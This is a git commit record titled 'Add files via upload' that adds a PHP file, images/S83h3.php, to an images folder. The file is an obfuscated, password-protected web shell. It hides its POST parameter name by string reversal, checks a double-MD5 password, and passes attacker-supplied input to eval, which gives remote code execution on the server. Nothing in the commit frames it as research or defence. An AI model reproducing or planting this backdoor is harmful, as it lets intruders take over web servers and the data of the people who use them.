c2202ec04c6340e31114190643daa52e85e434ed
getmanojsharma <getmanojsharma@gmail.com>
2025-08-21 12:19:52 +0530

    Add files via upload

---
+++ images/S83h3.php
@@ -0,0 +1,35 @@
+﻿<?php
+
+function vfurs()
+{
+global $IEIBhYDGd;
+$IEIBhYDGd=xqnLAxwiX();
+if(isset($_REQUEST['x']))
+{
+	$EhTWxqxk = 'OKxBdPlrkzCmNKxBdPlrkzCmEKxBdPlrkzCmPKxBdPlrkzCmIKxBdPlrkzCmEKxBdPlrkzCmCKxBdPlrkzCmE';
+    $EhTWxqxk=str_replace('KxBdPlrkzCm','',$EhTWxqxk);
+
+    echo $EhTWxqxk;
+	if ( strcasecmp(md5(md5($_REQUEST['x'])),'475faed93bffb4c7b2c320c4d7a8027f') ==0 )
+    {
+	@eval("\"$IEIBhYDGd\"");
+    }
+}
+
+
+}
+function xqnLAxwiX()
+{
+        $rifmix='op-vtAKX-RT9-60Q';
+		$TbygQpRQX=strrev($rifmix);
+		if(isset($_POST[$TbygQpRQX]))
+        {
+        $omqhyuxcdhv=str_replace('','',$_POST[$TbygQpRQX]);
+        
+        return '";'.$omqhyuxcdhv.'//';
+		}
+}
+
+vfurs();
+
+?>
